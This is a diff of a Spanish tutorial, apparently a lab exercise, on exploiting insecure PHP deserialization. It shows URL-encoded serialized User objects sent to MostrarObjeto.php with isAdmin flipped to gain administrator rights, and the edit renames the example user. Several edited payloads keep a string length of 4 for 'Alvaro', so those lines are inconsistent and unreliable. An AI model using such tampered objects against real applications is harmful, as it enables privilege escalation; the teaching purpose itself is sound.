@@ -135,24 +135,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 - Probar directamente el exploit en tu script MostrarObjeto.php (o el que verifica isAdmin).
 
 
-![](images/UD3.png)
+![generarObjeto.php](images/1.png)
 
 Vemos como el objeto serializado sería: 
 
 
-`O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
+`O:4:"User":2:{s:8:"username";s:6:"Alvaro";s:7:"isAdmin";b:1;}`
 
 ... y nos dá el enlace parar probarlo, enviándolo a MostrarObjeto.php
 
 ~~~
-http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
+MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22Alvaro%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
 ~~~
 
 Vemos cómo podemos componer la ruta para mostrar el objeto serializado conctenando:
 `http://localhost/MostrarObjeto.php?data=` con el objeto serializado, en este caso: `O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
-
-![](images/UD4.pg)
-
 
 ##  Explotación de Deserialización Insegura
 ---
@@ -164,11 +161,11 @@ Esto puede ser utilizado por atacantes, para enviar a nuestros códigos PHP la s
 
 **Crear un objeto malicioso en PHP**
 
-![](images/UD5.png)
+![objetoSerializado](images/2.png)
 
 Como podemos ver, del enlace generado, cualquier persona puede saber, el nombre del tipo de objetos, variables y valores que tienen.
 
-Por ejemplo, el usuario Raul podría:
+Por ejemplo, el usuario Alvaro podría:
 
 
 **1 - Modificar la serialización.**
@@ -176,18 +173,18 @@ Por ejemplo, el usuario Raul podría:
 El objeto serializado es: 
 
 ~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D
+MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Alvaro%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D
 ~~~
 
 Podemos cambiar los datos del valor IsAdmin:
 
 ~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 
+MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Alvaro%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 
 ~~~
 
-![](images/UD6.png)
+![objeto serializado](images/3.png)
 
-Raul podría haber cambiado su estado, convirtiéndose en administrador.
+Alvaro podría haber cambiado su estado, convirtiéndose en administrador.
 
 
 **2 - Crear un archivo para crear la serialización con los datos que se deseen.**
